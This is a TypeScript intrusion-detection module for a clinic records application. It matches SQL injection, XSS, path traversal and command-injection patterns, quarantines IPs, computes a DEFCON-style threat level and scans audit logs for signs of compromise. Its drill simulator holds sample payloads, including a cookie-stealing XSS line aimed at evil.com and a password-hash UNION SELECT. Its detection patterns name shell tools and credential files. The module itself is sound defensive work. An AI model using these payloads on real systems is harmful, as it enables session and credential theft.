/**
 * Copyright (c) 2026 Dr. Nitin Hiralal Sonare <sonarenitin3@gmail.com>. All Rights Reserved.
 * MedScript OPD - Proprietary Clinical Software.
 * Military Threat Sentinel & Intrusion Detection System (IDS / WAF)
 * Standards: DISA STIG, DoD Cyber Command Readiness, NIST SP 800-53 Rev 5
 */
import { sqlite } from '@/db';
import { createSecurityAlert } from '@/lib/security-engine';
import { logAuditEvent } from '@/lib/audit';
import { DefconLevel, DefconThreatStatus, QuarantinedIpRecord } from '@/types';

// ============================================================================
// 1. DEEP PAYLOAD HEURISTICS (WAF / IDS / ZERO-DAY DEFENSE)
// ============================================================================

export interface ThreatAnalysisResult {
  isMalicious: boolean;
  threatType?: 'SQL_INJECTION' | 'XSS_ATTEMPT' | 'PATH_TRAVERSAL' | 'COMMAND_INJECTION' | 'CANARY_TRIP';
  matchedPattern?: string;
  threatScore: number; // 0 (Benign) to 100 (Critical Exploit)
}

// SQL Injection Patterns (Union, Error-Based, Blind, Tautology, Stacked Queries)
const SQLI_REGEX = /(\b(UNION(\s+ALL)?\s+SELECT|SELECT\s+.+\s+FROM|INSERT\s+INTO.+VALUES|DELETE\s+FROM|DROP\s+(TABLE|DATABASE)|ALTER\s+TABLE|EXEC(\s|\+)+(SP_|XP_)|WAITFOR\s+DELAY|BENCHMARK\s*\(|SLEEP\s*\(|OR\s+['"]?1['"]?\s*=\s*['"]?1|AND\s+['"]?1['"]?\s*=\s*['"]?1|--|\/\*|\*\/)\b)/i;

// Cross-Site Scripting (XSS) Patterns (Script tags, event handlers, javascript pseudo-protocol, SVG/IMG payloads)
const XSS_REGEX = /(<\s*script\b[^>]*>|javascript\s*:\s*|vbscript\s*:\s*|data\s*:\s*text\/html|<\s*iframe\b|<\s*object\b|<\s*embed\b|on(error|load|click|mouseover|focus|blur|submit)\s*=)/i;

// Path Traversal & Local/Remote File Inclusion (LFI/RFI)
const PATH_TRAVERSAL_REGEX = /(\.\.[\/\\]|\/etc\/(passwd|shadow|hosts)|boot\.ini|win\.ini|%2e%2e[\/\\]|\/proc\/self)/i;

// Remote Command Execution (RCE) / Shell Metacharacters
const RCE_REGEX = /(\||;|`|\$\()\s*(cat|ls|whoami|id|curl|wget|nc|sh|bash|powershell|cmd|rm\s+-rf)/i;

/**
 * Inspects a string or URL query for malicious cyber attack signatures.
 */
export function inspectPayload(rawInput: string): ThreatAnalysisResult {
  if (!rawInput || typeof rawInput !== 'string') {
    return { isMalicious: false, threatScore: 0 };
  }

  const decoded = decodeSafely(rawInput);

  // Check Canary Token Traps (Tripping deliberate honey-parameters)
  if (decoded.includes('admin_debug_override=true') || decoded.includes('__honey_token__') || decoded.includes('/api/admin/dump')) {
    return {
      isMalicious: true,
      threatType: 'CANARY_TRIP',
      matchedPattern: 'Canary Trap Parameter Accessed',
      threatScore: 100,
    };
  }

  // Check SQL Injection
  const sqliMatch = decoded.match(SQLI_REGEX);
  if (sqliMatch) {
    return {
      isMalicious: true,
      threatType: 'SQL_INJECTION',
      matchedPattern: sqliMatch[0].slice(0, 40),
      threatScore: 90,
    };
  }

  // Check XSS
  const xssMatch = decoded.match(XSS_REGEX);
  if (xssMatch) {
    return {
      isMalicious: true,
      threatType: 'XSS_ATTEMPT',
      matchedPattern: xssMatch[0].slice(0, 40),
      threatScore: 85,
    };
  }

  // Check RCE (Shell metacharacters take highest precedence)
  const rceMatch = decoded.match(RCE_REGEX);
  if (rceMatch) {
    return {
      isMalicious: true,
      threatType: 'COMMAND_INJECTION',
      matchedPattern: rceMatch[0].slice(0, 40),
      threatScore: 95,
    };
  }

  // Check Path Traversal
  const ptMatch = decoded.match(PATH_TRAVERSAL_REGEX);
  if (ptMatch) {
    return {
      isMalicious: true,
      threatType: 'PATH_TRAVERSAL',
      matchedPattern: ptMatch[0].slice(0, 40),
      threatScore: 80,
    };
  }

  return { isMalicious: false, threatScore: 0 };
}

function decodeSafely(str: string): string {
  try {
    return decodeURIComponent(str);
  } catch {
    return str;
  }
}

// ============================================================================
// 2. AUTOMATED IP QUARANTINE & BLACKLIST SUBSYSTEM
// ============================================================================

const DEFAULT_QUARANTINE_DURATION_MS = 24 * 60 * 60 * 1000; // 24 Hours

/**
 * Checks whether an IP address is currently quarantined.
 */
export function isIpQuarantined(ipAddress: string): {
  quarantined: boolean;
  reason?: string;
  expiresAt?: Date | null;
} {
  try {
    const cleanIp = ipAddress.trim();
    const row = sqlite
      .prepare(
        'SELECT id, reason, expires_at, pardoned_at FROM quarantined_ips WHERE ip_address = ? LIMIT 1'
      )
      .get(cleanIp) as { id: number; reason: string; expires_at?: number | null; pardoned_at?: number | null } | undefined;

    if (!row) return { quarantined: false };

    // If pardoned by doctor
    if (row.pardoned_at) return { quarantined: false };

    // If expired
    if (row.expires_at && row.expires_at < Date.now()) {
      return { quarantined: false };
    }

    return {
      quarantined: true,
      reason: row.reason,
      expiresAt: row.expires_at ? new Date(row.expires_at) : null,
    };
  } catch {
    return { quarantined: false };
  }
}

/**
 * Places an attacker IP in military quarantine, records an alert, and updates DEFCON.
 */
export async function quarantineIp(
  ipAddress: string,
  reason: string,
  durationMs: number = DEFAULT_QUARANTINE_DURATION_MS
): Promise<void> {
  const cleanIp = ipAddress.trim();
  if (cleanIp === '127.0.0.1' || cleanIp === '::1' || cleanIp === 'localhost') {
    // Localhost protection - don't permanently lock out the local console, but log the event
    console.warn(`[MILITARY_SENTINEL] Local loopback triggered quarantine condition: ${reason}`);
  }

  const now = Date.now();
  const expiresAt = now + durationMs;

  try {
    // Upsert into quarantined_ips table
    const existing = sqlite
      .prepare('SELECT id, violation_count FROM quarantined_ips WHERE ip_address = ?')
      .get(cleanIp) as { id: number; violation_count: number } | undefined;

    if (existing) {
      sqlite
        .prepare(
          'UPDATE quarantined_ips SET violation_count = violation_count + 1, reason = ?, quarantined_at = ?, expires_at = ?, pardoned_at = NULL, pardoned_by = NULL WHERE id = ?'
        )
        .run(reason, now, expiresAt, existing.id);
    } else {
      sqlite
        .prepare(
          'INSERT INTO quarantined_ips (ip_address, reason, violation_count, quarantined_at, expires_at) VALUES (?, ?, 1, ?, ?)'
        )
        .run(cleanIp, reason, now, expiresAt);
    }

    // Generate CRITICAL security alert
    await createSecurityAlert({
      severity: 'CRITICAL',
      category: 'ACCESS_VIOLATION',
      title: `Military Sentinel: IP ${cleanIp} Quarantined`,
      description: `Automated Intrusion Detection quarantined host ${cleanIp}. Reason: "${reason}". Host connection dropped and blacklisted for 24 hours.`,
      ipAddress: cleanIp,
      metadata: { cleanIp, reason, expiresAt: new Date(expiresAt).toISOString() },
    });

    await logAuditEvent({
      action: 'SECURITY_ALERT_TRIGGERED',
      actorRole: 'SYSTEM',
      details: `Military Perimeter Quarantine: IP ${cleanIp} blocked (${reason})`,
      status: 'WARNING',
      ipAddress: cleanIp,
    });
  } catch (err) {
    console.error('Failed to quarantine IP:', err);
  }
}

/**
 * Pardons / releases a quarantined IP address (Admin Doctor action).
 */
export async function pardonQuarantinedIp(ipAddress: string, doctorName = 'Admin Doctor'): Promise<boolean> {
  try {
    const cleanIp = ipAddress.trim();
    sqlite
      .prepare(
        'UPDATE quarantined_ips SET pardoned_at = ?, pardoned_by = ? WHERE ip_address = ?'
      )
      .run(Date.now(), doctorName, cleanIp);

    await logAuditEvent({
      action: 'SECURITY_ALERT_ACKNOWLEDGED',
      actorRole: 'ADMIN_DOCTOR',
      details: `Quarantine Lifted: IP ${cleanIp} pardoned by ${doctorName}`,
      status: 'SUCCESS',
      ipAddress: cleanIp,
    });

    return true;
  } catch (err) {
    console.error('Failed to pardon IP:', err);
    return false;
  }
}

/**
 * Returns all active quarantined IPs.
 */
export function getActiveQuarantinedIps(): QuarantinedIpRecord[] {
  try {
    const rows = sqlite
      .prepare(
        'SELECT id, ip_address, reason, violation_count, quarantined_at, expires_at, pardoned_at, pardoned_by FROM quarantined_ips ORDER BY quarantined_at DESC LIMIT 50'
      )
      .all() as Array<{
        id: number;
        ip_address: string;
        reason: string;
        violation_count: number;
        quarantined_at: number;
        expires_at?: number | null;
        pardoned_at?: number | null;
        pardoned_by?: string | null;
      }>;

    return rows.map((r) => ({
      id: r.id,
      ipAddress: r.ip_address,
      reason: r.reason,
      violationCount: r.violation_count,
      quarantinedAt: new Date(r.quarantined_at),
      expiresAt: r.expires_at ? new Date(r.expires_at) : null,
      pardonedAt: r.pardoned_at ? new Date(r.pardoned_at) : null,
      pardonedBy: r.pardoned_by || null,
    }));
  } catch {
    return [];
  }
}

// ============================================================================
// 3. DEFCON DYNAMIC THREAT MATRIX (DOD READINESS LEVELS)
// ============================================================================

/**
 * Computes real-time dynamic DEFCON level based on active alerts, active quarantined
 * IPs, failed attempts, and lockdown state.
 */
export function calculateDynamicDefcon(): DefconThreatStatus {
  try {
    const settings = sqlite
      .prepare(
        'SELECT lockdown_active, deception_mode_active, defcon_level FROM clinic_settings WHERE id = 1'
      )
      .get() as { lockdown_active?: number; deception_mode_active?: number; defcon_level?: number } | undefined;

    const lockdownActive = Boolean(settings?.lockdown_active);
    const deceptionActive = Boolean(settings?.deception_mode_active);

    // Active unacknowledged alerts count
    const alerts = sqlite
      .prepare(
        'SELECT severity, category FROM security_alerts WHERE acknowledged_at IS NULL'
      )
      .all() as Array<{ severity: string; category: string }>;

    // Active quarantined IPs count
    const quarantinedCount = sqlite
      .prepare(
        'SELECT COUNT(*) as count FROM quarantined_ips WHERE pardoned_at IS NULL AND (expires_at IS NULL OR expires_at > ?)'
      )
      .get(Date.now()) as { count: number } | undefined;

    const activeQuarantine = quarantinedCount?.count || 0;
    const criticalAlerts = alerts.filter((a) => a.severity === 'CRITICAL').length;
    const warningAlerts = alerts.filter((a) => a.severity === 'WARNING').length;
    const tamperAlerts = alerts.filter((a) => a.category === 'INTEGRITY_TAMPER').length;

    const indicators: string[] = [];
    let calculatedLevel: DefconLevel = 5;
    let threatScore = 0;

    if (lockdownActive || tamperAlerts > 0) {
      calculatedLevel = 1;
      threatScore = 100;
      indicators.push('Emergency System Lockdown Active');
      if (tamperAlerts > 0) indicators.push(`${tamperAlerts} Cryptographic Tamper Event(s) Detected`);
    } else if (criticalAlerts >= 2 || activeQuarantine >= 2) {
      calculatedLevel = 2;
      threatScore = 75;
      indicators.push(`${criticalAlerts} Critical Threat Incident(s) Active`);
      indicators.push(`${activeQuarantine} Host IP(s) in Perimeter Quarantine`);
    } else if (activeQuarantine >= 1 || criticalAlerts === 1) {
      calculatedLevel = 3;
      threatScore = 50;
      if (activeQuarantine > 0) indicators.push(`${activeQuarantine} Host IP Quarantined`);
      if (criticalAlerts > 0) indicators.push('1 Critical Security Alert Pending');
    } else if (warningAlerts >= 1) {
      calculatedLevel = 4;
      threatScore = 25;
      indicators.push(`${warningAlerts} Security Warning(s) Active`);
    } else {
      calculatedLevel = 5;
      threatScore = 0;
      indicators.push('Perimeter Secure - All Automated Sentinels Active');
    }

    // If manual admin override is set to a more restrictive level, honor it
    if (settings?.defcon_level && settings.defcon_level < calculatedLevel) {
      calculatedLevel = settings.defcon_level as DefconLevel;
      indicators.push(`Manual Admin Override Enforced: DEFCON ${calculatedLevel}`);
    }

    const titles: Record<DefconLevel, string> = {
      1: 'DEFCON 1: MAXIMUM LOCKDOWN',
      2: 'DEFCON 2: HIGH THREAT POSTURE',
      3: 'DEFCON 3: ELEVATED READINESS',
      4: 'DEFCON 4: GUARDED MONITORING',
      5: 'DEFCON 5: NORMAL CLINICAL STATUS',
    };

    const recommendations: Record<DefconLevel, string> = {
      1: 'Non-admin mutations frozen. Verify database cryptographic hash chain and require Doctor Master PIN + MFA.',
      2: 'Active perimeter intrusion. Review quarantined IPs, enforce 10-minute session timeouts, and monitor audit logs.',
      3: 'Heightened surveillance. Multiple suspicious probes detected. Avoid downloading bulk patient exports.',
      4: 'Increased scrutiny. Failed PIN entries detected. Ensure staff authenticate with personal PINs.',
      5: 'Normal operations. Routine continuous cryptographic monitoring and active defense sentinels operating.',
    };

    const badgeVariants: Record<DefconLevel, 'destructive' | 'secondary' | 'default' | 'outline'> = {
      1: 'destructive',
      2: 'destructive',
      3: 'secondary',
      4: 'secondary',
      5: 'default',
    };

    return {
      level: calculatedLevel,
      title: titles[calculatedLevel],
      badgeVariant: badgeVariants[calculatedLevel],
      threatScore,
      indicators,
      recommendation: recommendations[calculatedLevel],
      quarantineCount: activeQuarantine,
      lockdownActive,
      deceptionActive,
    };
  } catch (err) {
    console.error('Failed to calculate DEFCON status:', err);
    return {
      level: 5,
      title: 'DEFCON 5: NORMAL CLINICAL STATUS',
      badgeVariant: 'default',
      threatScore: 0,
      indicators: ['Monitoring active'],
      recommendation: 'Normal operations',
      quarantineCount: 0,
      lockdownActive: false,
      deceptionActive: false,
    };
  }
}

/**
 * Manually updates the baseline DEFCON level override.
 */
export async function setDefconOverride(
  level: DefconLevel,
  reason: string,
  doctorName = 'Admin Doctor'
): Promise<boolean> {
  try {
    sqlite
      .prepare('UPDATE clinic_settings SET defcon_level = ? WHERE id = 1')
      .run(level);

    await logAuditEvent({
      action: 'SYSTEM_CONFIG_UPDATED',
      actorRole: 'ADMIN_DOCTOR',
      details: `DEFCON Threat Level manually changed to DEFCON ${level} by ${doctorName}: "${reason}"`,
      status: 'WARNING',
    });

    return true;
  } catch (err) {
    console.error('Failed to set DEFCON level:', err);
    return false;
  }
}

// ============================================================================
// 4. PENETRATION & RESILIENCE DRILL SIMULATOR
// ============================================================================

/**
 * Simulates a realistic military cyber penetration drill to verify automated
 * sentinel response, quarantine triggers, and alert dispatch.
 */
export async function runMilitarySecurityDrill(
  drillType: 'sqli_probe' | 'xss_probe' | 'tamper_probe' | 'brute_force_probe',
  testIp = '198.51.100.42'
): Promise<{ success: boolean; message: string; quarantined: boolean }> {
  if (drillType === 'sqli_probe') {
    const simulatedAttack = "' UNION SELECT password_hash FROM staff_users --";
    const analysis = inspectPayload(simulatedAttack);

    if (analysis.isMalicious) {
      await quarantineIp(
        testIp,
        `Military Security Drill: Simulated SQL Injection Probe ("${analysis.matchedPattern}")`,
        15 * 60 * 1000 // 15 minutes test quarantine
      );
      return {
        success: true,
        message: `Drill Succeeded: SQL Injection detected (Score ${analysis.threatScore}). Host ${testIp} automatically quarantined.`,
        quarantined: true,
      };
    }
  }

  if (drillType === 'xss_probe') {
    const simulatedAttack = '<script>document.location="http://evil.com/cookie="+document.cookie</script>';
    const analysis = inspectPayload(simulatedAttack);

    if (analysis.isMalicious) {
      await quarantineIp(
        testIp,
        `Military Security Drill: Simulated Cross-Site Scripting ("${analysis.matchedPattern}")`,
        15 * 60 * 1000
      );
      return {
        success: true,
        message: `Drill Succeeded: XSS payload detected (Score ${analysis.threatScore}). Host ${testIp} automatically quarantined.`,
        quarantined: true,
      };
    }
  }

  if (drillType === 'tamper_probe') {
    await createSecurityAlert({
      severity: 'CRITICAL',
      category: 'INTEGRITY_TAMPER',
      title: 'Military Security Drill: Simulated Tamper Alarm',
      description: `Simulated cryptographic digital seal verification failure triggered for drill verification from test IP ${testIp}.`,
      ipAddress: testIp,
      metadata: { testDrill: true },
    });
    return {
      success: true,
      message: 'Drill Succeeded: Cryptographic tamper alert generated. DEFCON threat status updated.',
      quarantined: false,
    };
  }

  if (drillType === 'brute_force_probe') {
    await quarantineIp(
      testIp,
      'Military Security Drill: Simulated Brute-Force Credential Attack (5 rapid failed PINs)',
      15 * 60 * 1000
    );
    return {
      success: true,
      message: `Drill Succeeded: Brute-force threshold exceeded. Host ${testIp} quarantined.`,
      quarantined: true,
    };
  }

  return { success: false, message: 'Unknown drill type', quarantined: false };
}

// ============================================================================
// 5. ACTIVE THREAT HUNTING & POST-BREACH IOC SCANNER (MITRE D3FEND™)
// ============================================================================

import { ThreatHuntingFinding, ThreatHuntingReport } from '@/types';

/**
 * Executes a deep threat hunting sweep across system state, audit logs,
 * authentication patterns, and clinical artifacts to detect hidden IOCs
 * and anti-forensic tampering (MITRE ATT&CK Post-Breach Analysis).
 */
export async function runThreatHuntingScan(): Promise<ThreatHuntingReport> {
  const findings: ThreatHuntingFinding[] = [];
  const scannedAt = new Date().toISOString();

  try {
    // 1. Audit Log Continuity & Monotonic Sequence Check (MITRE T1070.002)
    const auditRows = sqlite
      .prepare('SELECT id FROM audit_logs ORDER BY id ASC')
      .all() as Array<{ id: number }>;

    let auditGapsCount = 0;
    const gapSamples: string[] = [];

    for (let i = 1; i < auditRows.length; i++) {
      const prevId = auditRows[i - 1].id;
      const currId = auditRows[i].id;
      if (currId !== prevId + 1) {
        auditGapsCount += currId - prevId - 1;
        if (gapSamples.length < 3) {
          gapSamples.push(`Missing IDs between #${prevId} and #${currId}`);
        }
      }
    }

    if (auditGapsCount > 0) {
      findings.push({
        id: 'IOC-AUDIT-GAP',
        category: 'AUDIT_GAP',
        severity: 'CRITICAL',
        title: 'Anti-Forensic Log Excision Detected (MITRE T1070.002)',
        description: `Discontinuity in audit ledger: approximately ${auditGapsCount} missing sequential record IDs detected. Indicates manual row deletion or database truncation.`,
        evidence: gapSamples.join('; '),
        mitigation: 'Verify SQLite WORM engine triggers are active and audit trail hash chain integrity.',
      });
    }

    // 2. Cross-Subnet & Multi-IP Session Hopping Check (MITRE T1550.004)
    const twoHoursAgo = Date.now() - 2 * 60 * 60 * 1000;
    const recentAudit = sqlite
      .prepare(
        "SELECT actor_role, ip_address, timestamp FROM audit_logs WHERE timestamp >= ? AND ip_address IS NOT NULL AND actor_role != 'SYSTEM' ORDER BY timestamp DESC LIMIT 200"
      )
      .all(twoHoursAgo) as Array<{ actor_role: string; ip_address: string; timestamp: number | string }>;

    const roleIpsMap = new Map<string, Set<string>>();
    for (const entry of recentAudit) {
      const cleanIp = (entry.ip_address || '').trim().replace(/^::ffff:/, '');
      if (cleanIp && cleanIp !== '127.0.0.1' && cleanIp !== '::1') {
        if (!roleIpsMap.has(entry.actor_role)) {
          roleIpsMap.set(entry.actor_role, new Set());
        }
        roleIpsMap.get(entry.actor_role)!.add(cleanIp);
      }
    }

    for (const [role, ips] of roleIpsMap.entries()) {
      if (ips.size >= 2) {
        findings.push({
          id: `IOC-SESSION-${role}`,
          category: 'SESSION_ANOMALY',
          severity: 'WARNING',
          title: `Concurrent Multi-IP Access by ${role} (MITRE T1550.004)`,
          description: `Actor role "${role}" has initiated sessions from ${ips.size} distinct IP addresses within the past 2 hours. Potential credential sharing or LAN session cookie replay.`,
          evidence: `Observed IPs: ${Array.from(ips).join(', ')}`,
          mitigation: 'Execute targeted session revocation for this account or verify IP bindings.',
        });
      }
    }

    // 3. Unsealed Clinical Artifacts Check (Integrity Gap)
    const unsealedRx = (sqlite
      .prepare("SELECT COUNT(*) as count FROM prescriptions WHERE signature_hash IS NULL OR signature_hash = ''")
      .get() as { count: number })?.count || 0;

    const unsealedLabs = (sqlite
      .prepare("SELECT COUNT(*) as count FROM lab_reports WHERE digital_seal_hash IS NULL OR digital_seal_hash = ''")
      .get() as { count: number })?.count || 0;

    const unsealedEmar = (sqlite
      .prepare("SELECT COUNT(*) as count FROM emar_records WHERE digital_seal_hash IS NULL OR digital_seal_hash = ''")
      .get() as { count: number })?.count || 0;

    const unsealedHandovers = (sqlite
      .prepare("SELECT COUNT(*) as count FROM ipd_handovers WHERE digital_seal_hash IS NULL OR digital_seal_hash = ''")
      .get() as { count: number })?.count || 0;

    const totalUnsealed = unsealedRx + unsealedLabs + unsealedEmar + unsealedHandovers;
    if (totalUnsealed > 0) {
      findings.push({
        id: 'IOC-UNSEALED-ARTIFACTS',
        category: 'UNSEALED_RECORD',
        severity: totalUnsealed > 10 ? 'WARNING' : 'INFO',
        title: 'Unsealed Clinical Records Detected',
        description: `Found ${totalUnsealed} clinical record(s) lacking cryptographic digital seal signatures (Rx: ${unsealedRx}, Labs: ${unsealedLabs}, eMAR: ${unsealedEmar}, Handovers: ${unsealedHandovers}).`,
        evidence: `Unsealed counts: Prescriptions=${unsealedRx}, Labs=${unsealedLabs}, eMAR=${unsealedEmar}, Handovers=${unsealedHandovers}`,
        mitigation: 'Run Fleet Cryptographic Sweep to seal and verify all legacy records.',
      });
    }

    // 4. Off-Hours Administrative Mutations (MITRE T1078.004)
    const sevenDaysAgo = Date.now() - 7 * 24 * 60 * 60 * 1000;
    const adminEvents = sqlite
      .prepare(
        "SELECT id, action, details, timestamp, ip_address FROM audit_logs WHERE timestamp >= ? AND action IN ('STAFF_USER_CREATED', 'STAFF_USER_UPDATED', 'STAFF_PASSWORD_RESET', 'SETTINGS_SAVED', 'SYSTEM_CONFIG_UPDATED') ORDER BY timestamp DESC LIMIT 50"
      )
      .all(sevenDaysAgo) as Array<{ id: number; action: string; details: string | null; timestamp: number | string; ip_address: string | null }>;

    const offHoursAdmin: string[] = [];
    for (const ev of adminEvents) {
      const d = new Date(ev.timestamp);
      const hour = d.getHours();
      if (hour >= 22 || hour < 6) {
        offHoursAdmin.push(`[${d.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}] ${ev.action}: ${ev.details || ''}`);
      }
    }

    if (offHoursAdmin.length > 0) {
      findings.push({
        id: 'IOC-OFFHOURS-ADMIN',
        category: 'OFF_HOURS_ACTIVITY',
        severity: 'INFO',
        title: 'Off-Hours Administrative Activity Detected',
        description: `${offHoursAdmin.length} administrative configuration or credential changes occurred outside clinical hours (10:00 PM - 06:00 AM) within the last 7 days.`,
        evidence: offHoursAdmin.slice(0, 3).join('; '),
        mitigation: 'Verify that late-night administrator modifications were authorized by hospital leadership.',
      });
    }

    // 5. Cumulative Data Export Volume Check (MITRE T1005 / T1030)
    const oneDayAgo = Date.now() - 24 * 60 * 60 * 1000;
    const exportEvents = (sqlite
      .prepare(
        "SELECT COUNT(*) as count FROM audit_logs WHERE timestamp >= ? AND action IN ('DATA_EXPORT_PATIENTS', 'DATA_EXPORT_CONSULTATIONS', 'BACKUP_SNAPSHOT_DOWNLOADED')"
      )
      .get(oneDayAgo) as { count: number })?.count || 0;

    if (exportEvents >= 3) {
      findings.push({
        id: 'IOC-HIGH-EXPORT-RATE',
        category: 'RATE_LIMIT_SPIKE',
        severity: exportEvents >= 5 ? 'WARNING' : 'INFO',
        title: 'Elevated Daily Patient Data Export Volume',
        description: `${exportEvents} mass data export requests registered in the last 24 hours. Verify that these downloads correspond to legitimate clinical or statutory reporting requirements.`,
        evidence: `${exportEvents} export events in 24h window`,
        mitigation: 'Review audit logs for DATA_EXPORT_* and verify exporting user credentials.',
      });
    }
  } catch (err: unknown) {
    console.error('Threat hunting scan error:', err);
  }

  const criticalCount = findings.filter((f) => f.severity === 'CRITICAL').length;
  const warningCount = findings.filter((f) => f.severity === 'WARNING').length;

  return {
    scannedAt,
    totalFindings: findings.length,
    criticalCount,
    warningCount,
    cleanStatus: findings.length === 0,
    findings,
  };
}

